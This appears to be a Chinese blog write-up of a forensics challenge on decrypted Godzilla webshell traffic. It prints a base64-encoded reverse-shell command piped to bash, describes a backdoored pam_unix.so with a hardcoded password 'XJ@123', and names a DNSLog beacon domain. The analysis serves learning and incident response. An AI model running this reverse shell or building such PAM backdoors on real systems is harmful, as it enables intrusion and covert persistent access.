+<p><strong>所以“<code>Debian GNU/Linux 10 (buster)</code>”就是黑客查询到的发行版本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Debian GNU/Linux 10 (buster)&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="9、黑客利用webshell执行命令还查询并过滤了什么？（提交整条执行成功的命令）"><a href="#9、黑客利用webshell执行命令还查询并过滤了什么？（提交整条执行成功的命令）" class="headerlink" title="9、黑客利用webshell执行命令还查询并过滤了什么？（提交整条执行成功的命令）"></a>9、黑客利用webshell执行命令还查询并过滤了什么？（提交整条执行成功的命令）</h2><p>也是在下一个流找到了</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423020836827.png" alt="image-20250423020836827"></p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423020848552.png" alt="image-20250423020848552"></p>
+<p>这里解释一下命令：</p>
+<p><code>cd &quot;/&quot;;rmp -qa | grep pam</code>：**<code>rpm -qa</code><strong>是列出系统中所有已安装的 RPM 包，而</strong><code>grep pam</code>**是从 <code>rpm -qa</code> 的输出中筛选出包含 <strong><code>pam</code></strong> 的行。</p>
+<p>一开始以为是这个答案，后面提交却不正确，是为什么呢？</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423021119043.png" alt="image-20250423021119043"></p>
+<p>从刚刚的响应数据包解密中可以看到，这里的rmp命令是不存在的，也就是说刚刚的命令是执行失败了的，那我们继续往下看</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423021506133.png" alt="image-20250423021506133"></p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423021522479.png" alt="image-20250423021522479"></p>
+<p>解释一下命令：</p>
+<ul>
+<li><code>cd &quot;/&quot;;dpkg -l libpam-modules:amd64</code>：</li>
+</ul>
+<p><code>dpkg -l</code></p>
+<ul>
+<li>功能：列出系统中已安装的 Debian 包。<ul>
+<li>**<code>dpkg</code>**：Debian Package Manager，用于管理 Debian 格式的软件包。</li>
+<li>**<code>-l</code>**：列出已安装的包。</li>
+</ul>
+</li>
+</ul>
+<p><code>libpam-modules:amd64</code></p>
+<ul>
+<li>功能：指定要查询的包名。<ul>
+<li>**<code>libpam-modules</code>**：Pluggable Authentication Modules（PAM）的核心模块包，用于 Linux 系统的身份验证。</li>
+<li>**<code>:amd64</code>**：指定包的架构为 64 位（适用于 64 位系统）。</li>
+</ul>
+</li>
+</ul>
+<p>黑客通过这个命令查询并过滤了与 <code>libpam-modules</code> 包相关的信息,指定包的架构为 64 位</p>
+<p>然后我们看看响应</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423021741611.png" alt="image-20250423021741611"></p>
+<p>成功执行并回显，那么这个命令就是我们想找的查询命令了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dpkg -l libpam-modules:amd64&#125;</span><br></pre></td></tr></table></figure>
+
+<p>响应具体的解释可以去看我引用的师傅的文章，写的嘎嘎细！</p>
+<h2 id="10、黑客留下后门的反连的IP和PORT是什么？（IP-PORT"><a href="#10、黑客留下后门的反连的IP和PORT是什么？（IP-PORT" class="headerlink" title="10、黑客留下后门的反连的IP和PORT是什么？（IP:PORT)"></a>10、黑客留下后门的反连的IP和PORT是什么？（IP:PORT)</h2><h3 id="反向连接（Reverse-Connection）是什么"><a href="#反向连接（Reverse-Connection）是什么" class="headerlink" title="反向连接（Reverse Connection）是什么"></a>反向连接（Reverse Connection）是什么</h3><ol>
+<li>定义：</li>
+</ol>
+<p>在反向连接中，受害者的计算机（目标系统）主动向黑客控制的计算机（攻击者）发起连接。这与传统的连接方式不同，通常是攻击者直接连接到受害者的计算机。</p>
+<h3 id="IP-和-PORT是什么"><a href="#IP-和-PORT是什么" class="headerlink" title="IP 和 PORT是什么"></a>IP 和 PORT是什么</h3><ol>
+<li>IP 地址：这是黑客控制的服务器或计算机的网络地址，黑客在其后门程序中配置此地址，以便目标系统能够找到并连接到黑客的机器。</li>
+<li>端口：这是指定的网络端口，用于接收连接请求。黑客可以选择常用端口（如 80、443）以避免引起怀疑，或者使用不常用的端口以减少被检测的风险。</li>
+</ol>
+<p>看到这个我第一反应就是反弹shell，继续往下看就能看到一个数据包</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423021928796.png" alt="image-20250423021928796"></p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423021946467.png" alt="image-20250423021946467"></p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423022007129.png" alt="image-20250423022007129"></p>
+<p>解释一下命令：</p>
+<ul>
+<li><code>echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bash</code>：该命令首先输出一个经过Base64编码的字符串，然后通过管道符将输出转为后一个命令的输入，也就是将字符串进行base64解码，然后再通过管道符转向下一个命令 <code>bash</code> 执行。</li>
+</ul>
+<p>就是反弹shell，这里也直接给出了ip和端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.31.143:1313&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="11、黑客通过什么文件留下了后门？"><a href="#11、黑客通过什么文件留下了后门？" class="headerlink" title="11、黑客通过什么文件留下了后门？"></a>11、黑客通过什么文件留下了后门？</h2><h3 id="什么是后门文件？"><a href="#什么是后门文件？" class="headerlink" title="什么是后门文件？"></a>什么是后门文件？</h3><p><strong>后门文件</strong>（Backdoor File）是指一种恶意文件或程序，攻击者通过它可以在未经授权的情况下访问或控制系统。</p>
+<h3 id="后门文件的特点"><a href="#后门文件的特点" class="headerlink" title="后门文件的特点"></a>后门文件的特点</h3><ol>
+<li><strong>隐蔽性</strong>：<ul>
+<li>后门文件通常会被伪装成合法的文件或程序，或者隐藏在系统的正常文件中，以避免被用户或安全软件发现。</li>
+</ul>
+</li>
+<li><strong>持久性</strong>：<ul>
+<li>后门文件可能会通过修改系统配置文件、注册表或启动项，确保在系统重启后仍然能够运行。</li>
+</ul>
+</li>
+<li><strong>绕过安全机制</strong>：<ul>
+<li>后门文件通常会利用漏洞或特权提升技术，绕过系统的身份验证、防火墙或其他安全措施。</li>
+</ul>
+</li>
+<li><strong>远程控制</strong>：<ul>
+<li>后门文件通常与远程服务器通信，允许攻击者远程执行命令、窃取数据或控制系统。</li>
+</ul>
+</li>
+</ol>
+<p>然后我们继续看下面的数据包</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423022531853.png" alt="image-20250423022531853"></p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423022551687.png" alt="image-20250423022551687"></p>
+<p>这里使用了一个<code>getFiledirName</code> 方法</p>
+<h3 id="getFiledirName-方法"><a href="#getFiledirName-方法" class="headerlink" title="getFiledirName 方法"></a><code>getFiledirName</code> 方法</h3><p><code>getFiledirName</code> 方法通常用于获取文件所在的目录路径或文件名。</p>
+<p>但是在响应的目录文件中没看到什么明显的可疑文件</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423022735132.png" alt="image-20250423022735132"></p>
+<p>然后下面还对tmp目录下的文件名进行了查看</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423022828891.png" alt="image-20250423022828891"></p>
+<p>紧接着看到一个很长的数据包</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423022859728.png" alt="image-20250423022859728"></p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423022952007.png" alt="image-20250423022952007"></p>
+<p>文件路径：&#x2F;tmp&#x2F;pam_unix.so</p>
+<p>&#x2F;tmp 目录通常用于存储临时文件，黑客选择这个目录可能是为了避开监控，因为很多系统管理员不会频繁检查该目录。<br>pam_unix.so 是一个常见的动态链接库文件，通常与 PAM（可插入式认证模块）相关联。这个文件名暗示了它可能涉及系统的身份验证。<br>文件类型：NELF</p>
+<p>NELF 是指该文件是一个可执行的 ELF（可执行和可链接格式）文件，通常用于 Linux 系统中的可执行程序和共享库。</p>
+<h3 id="后门目的"><a href="#后门目的" class="headerlink" title="后门目的"></a>后门目的</h3><p>利用 PAM：</p>
+<p>黑客可能利用这个库文件来创建一个后门，使得通过 PAM 进行身份验证时，黑客能够获得访问权限。这可以让他们在用户登录时获得控制权。<br>隐蔽性：</p>
+<p>由于文件名与正常的系统文件相似，黑客可以更容易地隐藏他们的活动，降低被检测的风险。<br>持久性：</p>
+<p>通过将后门与 PAM 模块关联，黑客可以在系统重启后仍然保持访问权限，因为 PAM 在系统启动和用户登录时都会被调用。</p>
+<p>然后我们还可以看一下这里的响应</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423023127509.png" alt="image-20250423023127509"></p>
+<p>成功执行说明文件写入了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;pam_unix.so&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="12、黑客设置的后门密码是什么？"><a href="#12、黑客设置的后门密码是什么？" class="headerlink" title="12、黑客设置的后门密码是什么？"></a>12、黑客设置的后门密码是什么？</h2><p>我往后看的时候发现已经没有数据包了，那么既然这里问到了后门密码，然后我们找到了后门文件，肯定这时候后门密码就是在后门文件中了</p>
+<p>师傅的分析：</p>
+<p><strong>题目问我们黑客设置后门密码是什么？那刚刚我们已经找出黑客留下的后门文件——“pam_unix.so”了，那这里又问我们后门密码，那这里多半后门密码是在后门文件中，那这时候我们就要想办法把后门文件“pam_unix.so”给“down”下来进行分析</strong></p>
+<p>如果需要下载下来的话，那我们这时候就需要连接服务器了</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423023523351.png" alt="image-20250423023523351"></p>
+<p>连上了我们直接去找那个文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;pam_unix.so&quot; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423023710871.png" alt="image-20250423023710871"></p>
+<p>把他下载下来</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423023958206.png" alt="image-20250423023958206"></p>
+<p><strong>我们使用<code>file</code>命令来查看一下文件</strong>，<strong>在 Linux 中，<code>file</code> 命令用于确定文件的类型。它通过检查文件的内容而不仅仅是文件的扩展名来识别文件类型。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file pam_unix.so</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423024303031.png" alt="image-20250423024303031"></p>
+<p>完全看不懂啊，只能看看师傅的分析：</p>
+<ul>
+<li><code>ELF 64-bit LSB shared object</code></li>
+</ul>
+<ol>
+<li><code>ELF</code>：表示该文件是以可执行和可链接格式（ELF）编写的，这是 Linux 和 Unix 系统中常用的可执行文件格式。</li>
+<li><code>64-bit</code>：表示该文件是为 64 位系统编译的。</li>
+<li><code>LSB</code>：代表 Linux Standard Base，指该文件遵循 Linux 标准基准的格式。</li>
+<li><code>shared object</code>：指这是一个共享对象文件，即可以被多个程序共享的库文件。</li>
+</ol>
+<ul>
+<li><code>x86-64</code></li>
+</ul>
+<p>表示该文件是为 x86-64 架构（64 位 Intel&#x2F;AMD 处理器）编译的。</p>
+<ul>
+<li><code>version 1 (SYSV)</code></li>
+</ul>
+<p>表示这是第一版本的系统 V ABI（应用二进制接口），通常用于描述二进制接口规范。</p>
+<ul>
+<li><code>dynamically linked</code></li>
+</ul>
+<p>表示该共享库是在运行时链接的，这意味着它可能依赖其他库，且在程序执行时会加载这些依赖。</p>
+<ul>
+<li><code>BuildID[sha1]=b823fd038f580c704c3c8e26f383e82b7cdb5f59</code></li>
+</ul>
+<p>表示该文件的构建 ID，通常用于版本管理和调试。</p>
+<ul>
+<li><code>with debug_info</code></li>
+</ul>
+<p>表示该文件包含调试信息。这意味着开发者可以在调试程序时获得更多上下文信息，比如函数名、变量名等。</p>
+<ul>
+<li><code>not stripped</code></li>
+</ul>
+<p>表示该文件没有被“剥离”，也就是说，它保留了符号表和调试信息。通常在发布版本时，文件会被剥离，以减小大小和保护内部实现。</p>
+<p><strong><code>pam_unix.so</code> 是一个为 64 位 x86-64 架构编写的动态链接共享库，遵循 ELF 格式，包含调试信息且没有剥离。它是 PAM（可插入式认证模块）的一部分，用于处理基于 UNIX 的身份验证。</strong></p>
+<p>好吧，这里还得用IDA，电脑重装后都没安装过，我们需要<strong>丢进64位的IDA中进行分析</strong></p>
+<p><strong>IDA（Interactive DisAssembler）是一个广泛使用的反汇编和逆向工程工具，主要用于分析和理解二进制文件。</strong></p>
+<p><code>pam_sm_authenticate</code> 是 PAM（可插拔认证模块）框架中的一个函数，主要用于用户身份验证。这个函数的作用是对用户提供的凭证（如密码）进行验证，通常是在 PAM 模块中实现的。</p>
+<p>所以我们打开IDA后就直接找这个函数就行，借师傅一张图吧</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/6b0edff64860456683644e062508a241.png" alt="在这里插入图片描述"></p>
+<p>代码分析（大师傅的）</p>
+<ul>
+<li><p><code>pam_set_data(pamh, &quot;unix_setcred_return&quot;, v6, setcred_free);</code>：将某些认证数据<code>（v6）</code>存储在 PAM 句柄中，便于后续使用。</p>
+</li>
+<li><p><code>authtok = pam_get_authtok();</code>：调用 pam_get_authtok() 获取用户的认证令牌（通常是密码）。</p>
+</li>
+<li><p>密码检查：如果 authtok 不存在，调用 <code>unix_verify_password(pamh, name, p, v4); </code>来验证密码。如果验证失败，记录日志并返回错误代码。</p>
+</li>
+<li><p>特殊密码检查：代码中有一行<code> v12 = strcmp(&quot;XJ@123&quot;, p) == 0;</code>，用于检查输入密码是否为 <code>&quot;XJ@123&quot;</code>。如果匹配成功，设置返回值 v8。</p>
+</li>
+<li><p>记录日志：使用 <code>pam_syslog</code> 记录关于用户名的错误信息，如果用户名不正确，返回相应的错误代码。</p>
+</li>
+<li><p>后门密码分析所以可以确认的是黑客设置的后门密码是：<code>&quot;XJ@123&quot;。</code></p>
+</li>
+<li><p>为什么确定是：代码中明确比较用户输入的密码是否等于 <code>&quot;XJ@123&quot;</code>，并根据比较结果决定认证是否成功。如果这个密码被硬编码在代码中，黑客可能利用这个密码获得不当访问权限。</p>
+</li>
+<li><p>总结</p>
+</li>
+</ul>
+<p>代码的逻辑表明，黑客通过在身份验证逻辑中嵌入一个特定的密码 “XJ@123” 来创建后门，使得他们能够绕过正常的身份验证流程。</p>
+<p>所以最终的密码就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;XJ@123&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="13、黑客的恶意dnslog服务器地址是什么？"><a href="#13、黑客的恶意dnslog服务器地址是什么？" class="headerlink" title="13、黑客的恶意dnslog服务器地址是什么？"></a>13、黑客的恶意dnslog服务器地址是什么？</h2><h3 id="什么是dnslog服务器？"><a href="#什么是dnslog服务器？" class="headerlink" title="什么是dnslog服务器？"></a>什么是dnslog服务器？</h3><p><strong>DNSLog 服务器</strong> 是一种用于网络安全检测和渗透测试的工具，主要用于记录和捕获 DNS 查询请求。它通过模拟一个 DNS 服务器，接收并记录目标系统或应用程序发送的 DNS 请求，从而帮助安全研究人员或渗透测试人员检测漏洞或验证攻击是否成功。</p>
+<hr>
+<h4 id="DNSLog-服务器的工作原理"><a href="#DNSLog-服务器的工作原理" class="headerlink" title="DNSLog 服务器的工作原理"></a><strong>DNSLog 服务器的工作原理</strong></h4><ol>
+<li><strong>域名生成</strong>：<ul>
+<li>DNSLog 服务器会生成一个唯一的子域名（例如 <code>abc123.dnslog.cn</code>），并将该域名提供给用户或测试工具。</li>
+</ul>
+</li>
+<li><strong>DNS 查询触发</strong>：<ul>
+<li>用户或测试工具将生成的域名嵌入到目标系统或应用程序中（例如，通过漏洞利用、恶意代码注入等）。</li>
+<li>如果目标系统或应用程序解析了该域名，就会向 DNSLog 服务器发送 DNS 查询请求。</li>
+</ul>
+</li>
+<li><strong>记录和显示</strong>：<ul>
+<li>DNSLog 服务器会记录所有接收到的 DNS 查询请求，并在 Web 界面上显示查询的详细信息（如查询时间、源 IP 地址、查询的域名等）。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h4 id="DNSLog-服务器的用途"><a href="#DNSLog-服务器的用途" class="headerlink" title="DNSLog 服务器的用途"></a><strong>DNSLog 服务器的用途</strong></h4><ol>
+<li><strong>漏洞检测</strong>：<ul>
+<li>用于检测目标系统是否存在 DNS 查询相关的漏洞（例如，DNS 注入、SSRF、XXE 等）。</li>
+<li>通过观察 DNSLog 服务器是否收到查询请求，可以判断漏洞是否被成功利用。</li>
+</ul>
+</li>
+<li><strong>无回显漏洞验证</strong>：<ul>
+<li>对于某些无回显的漏洞（例如 Blind SQL 注入、命令注入等），DNSLog 服务器可以作为外带通道，帮助验证漏洞是否存在。</li>
+</ul>
+</li>
+<li><strong>渗透测试</strong>：<ul>
+<li>在渗透测试中，DNSLog 服务器可以用于测试目标系统的 DNS 解析行为，或验证某些攻击是否成功。</li>
+</ul>
+</li>
+<li><strong>日志分析</strong>：<ul>
+<li>通过分析 DNSLog 服务器记录的查询请求，可以了解目标系统的网络行为或攻击者的活动轨迹。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h4 id="DNSLog-服务器的特点"><a href="#DNSLog-服务器的特点" class="headerlink" title="DNSLog 服务器的特点"></a><strong>DNSLog 服务器的特点</strong></h4><ol>
+<li><strong>无侵入性</strong>：<ul>
+<li>DNSLog 服务器仅记录 DNS 查询请求，不会对目标系统造成额外的影响。</li>
+</ul>
+</li>
+<li><strong>实时性</strong>：<ul>
+<li>DNSLog 服务器会实时显示接收到的 DNS 查询请求，方便用户快速获取结果。</li>
+</ul>
+</li>
+<li><strong>易于使用</strong>：<ul>
+<li>用户只需访问 DNSLog 服务器的 Web 界面，生成一个唯一的子域名，并将其嵌入到目标系统中即可。</li>
+</ul>
+</li>
+<li><strong>支持多种场景</strong>：<ul>
+<li>适用于多种漏洞检测和渗透测试场景，尤其是无回显漏洞的验证。</li>
+</ul>
+</li>
+</ol>
+<p>推荐一个DNS服务器的在线平台：<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">dnslog在线</a></p>
+<p>那这道题我们该怎么做呢？</p>
+<p>同样的，我直接看着师傅的wp了</p>
+<p>在IDA中继续看</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/de7d967445b644c38bc7e976ac2799e0.png" alt="img"></p>
+<p><strong>首先可以确认恶意 DNSLog 服务器地址：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c0ee2ad2d8.ipv6.xxx.eu.org.</span><br></pre></td></tr></table></figure>
+
+<p>为什么是这个地址</p>
+<ul>
+<li>动态生成：</li>
+</ul>
+<p>代码中使用 snprintf 函数构造了一个 DNS 名称，结合了 name 和 p 变量。虽然具体的 name 和 p 值没有给出，但可以确定最终的地址是以 <code>c0ee2ad2d8.ipv6.xxx.eu.org. </code>结尾。</p>
+<ul>
+<li>恶意意图：</li>
+</ul>
+<p>这个 DNS 名称的构造意图是让被感染的系统向这个地址发送 DNS 请求，黑客可以通过 DNSLog 服务器记录下请求，获取用户的信息或活动。</p>
+<ul>
+<li>与攻击者的联系：</li>
+</ul>
+<p>通过这个地址，攻击者可以监控和识别目标系统，进而实施进一步的攻击或数据窃取。</p>
+<ul>
+<li>总结</li>
+</ul>
+<p>恶意 DNSLog 服务器的地址 c0ee2ad2d8.ipv6.xxx.eu.org. 是代码动态生成的，目的是监控用户活动并建立与攻击者的联系。</p>
+<p>所以最终的flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c0ee2ad2d8.ipv6.xxx.eu.org.&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>终于看完了，此行也算是受益颇多了，做这个哥斯拉主要是因为之前在做一道陇剑杯的题，但是当时不知道哥斯拉的特征和流量怎么分析，然后又不太会抓现成的，所以就直接做玄机的题目了，没关系，后面会学习如何抓现成的包去进行深入分析</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-number">1.</span> <span class="toc-text">什么是哥斯拉</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89webshell%E7%9A%84%E7%89%B9%E5%BE%81"><span class="toc-number">2.</span> <span class="toc-text">哥斯拉webshell的特征</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">哥斯拉加密分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E9%BB%91%E5%AE%A2%E7%9A%84IP%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">4.1.</span> <span class="toc-text">1、黑客的IP是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E9%BB%91%E5%AE%A2%E6%98%AF%E9%80%9A%E8%BF%87%E4%BB%80%E4%B9%88%E6%BC%8F%E6%B4%9E%E8%BF%9B%E5%85%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%EF%BC%9F%EF%BC%88%E6%8F%90%E4%BA%A4CVE%E7%BC%96%E5%8F%B7%EF%BC%89"><span class="toc-number">4.2.</span> <span class="toc-text">2、黑客是通过什么漏洞进入服务器的？（提交CVE编号）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#204%E7%8A%B6%E6%80%81%E7%A0%81"><span class="toc-number">4.2.1.</span> <span class="toc-text">204状态码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell%E5%88%86%E6%9E%90"><span class="toc-number">4.2.2.</span> <span class="toc-text">webshell分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E9%BB%91%E5%AE%A2%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%E5%90%8D%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F-%E6%8F%90%E4%BA%A4%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">4.3.</span> <span class="toc-text">3、黑客上传的木马文件名是什么？(提交文件名)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E9%BB%91%E5%AE%A2%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%9C%A8%E9%A9%AC%E8%BF%9E%E6%8E%A5%E5%AF%86%E7%A0%81%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">4.4.</span> <span class="toc-text">4、黑客上传的木马连接密码是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E9%BB%91%E5%AE%A2%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%9C%A8%E9%A9%AC%E8%A7%A3%E5%AF%86%E5%AF%86%E9%92%A5%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">4.5.</span> <span class="toc-text">5、黑客上传的木马解密密钥是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%A8%E9%A9%AC%E7%9A%84%E8%A7%A3%E5%AF%86%E5%AF%86%E9%92%A5%EF%BC%9F"><span class="toc-number">4.5.1.</span> <span class="toc-text">什么是木马的解密密钥？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E9%BB%91%E5%AE%A2%E8%BF%9E%E6%8E%A5webshell%E5%90%8E%E6%89%A7%E8%A1%8C%E7%9A%84%E7%AC%AC%E4%B8%80%E6%9D%A1%E5%91%BD%E4%BB%A4%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">4.6.</span> <span class="toc-text">6、黑客连接webshell后执行的第一条命令是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7"><span class="toc-number">4.6.1.</span> <span class="toc-text">哥斯拉流量解密工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">4.6.2.</span> <span class="toc-text">恶意代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%8F%8F%E8%BF%B0"><span class="toc-number">4.6.2.1.</span> <span class="toc-text">命令执行的描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E5%88%86%E8%A7%A3"><span class="toc-number">4.6.2.2.</span> <span class="toc-text">参数分解</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81%E9%BB%91%E5%AE%A2%E8%BF%9E%E6%8E%A5webshell%E6%97%B6%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8Dshell%E7%9A%84%E6%9D%83%E9%99%90%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">4.7.</span> <span class="toc-text">7、黑客连接webshell时查询当前shell的权限是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Eid%E5%91%BD%E4%BB%A4"><span class="toc-number">4.7.1.</span> <span class="toc-text">关于id命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E3%80%81%E9%BB%91%E5%AE%A2%E5%88%A9%E7%94%A8webshell%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%9F%A5%E8%AF%A2%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%B3%BB%E7%BB%9F%E5%8F%91%E8%A1%8C%E7%89%88%E6%9C%AC%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">4.8.</span> <span class="toc-text">8、黑客利用webshell执行命令查询服务器Linux系统发行版本是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Liunx%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8F%91%E8%A1%8C%E7%9A%84%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC"><span class="toc-number">4.8.1.</span> <span class="toc-text">Liunx常见的发行的系统版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 